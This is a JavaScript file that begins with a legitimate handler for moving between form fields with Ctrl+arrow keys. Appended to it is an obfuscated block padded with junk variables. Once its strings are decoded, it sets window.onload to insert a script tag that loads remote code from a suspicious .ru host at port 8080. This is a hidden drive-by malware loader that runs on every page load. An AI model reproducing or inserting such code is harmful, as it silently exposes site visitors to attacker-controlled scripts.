/**
  * Allows moving around inputs/select by Ctrl+arrows
  *
  * @param   object   event data
  */
function onKeyDownArrowsHandler(e) {
    e = e||window.event;
    var o = (e.srcElement||e.target);
    if (!o) return;
    if (o.tagName != "TEXTAREA" && o.tagName != "INPUT" && o.tagName != "SELECT") return;
    if (navigator.userAgent.toLowerCase().indexOf('aplewebkit/') != -1) {
        if (e.ctrlKey || e.shiftKey || !e.altKey) return;
    } else {
        if (!e.ctrlKey || e.shiftKey || e.altKey) return;
    }
    if (!o.id) return;

    var pos = o.id.split("_");
    if (pos[0] != "field" || typeof pos[2] == "undefined") return;

    var x = pos[2], y=pos[1];

    // skip non existent fields
    for (i=0; i<10; i++)
    {
        if (switch_movement) {
            switch(e.keyCode) {
                case 38: x--; break; // up
                case 40: x++; break; // down
                case 37: y--; break; // left
                case 39: y++; break; // right
                default: return;
            }
        } else {
            switch(e.keyCode) {
                case 38: y--; break; // up
                case 40: y++; break; // down
                case 37: x--; break; // left
                case 39: x++; break; // right
                default: return;
            }
        }

        var id = "field_" + y + "_" + x;
        var nO = document.getElementById(id);
        if (!nO) {
            var id = "field_" + y + "_" + x + "_0";
            var nO = document.getElementById(id);
        }
        if (nO) break;
    }

    if (!nO) return;
    nO.focus();
    if (nO.tagName != 'SELECT') {
        nO.select();
    }
    e.returnValue = false;
}


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';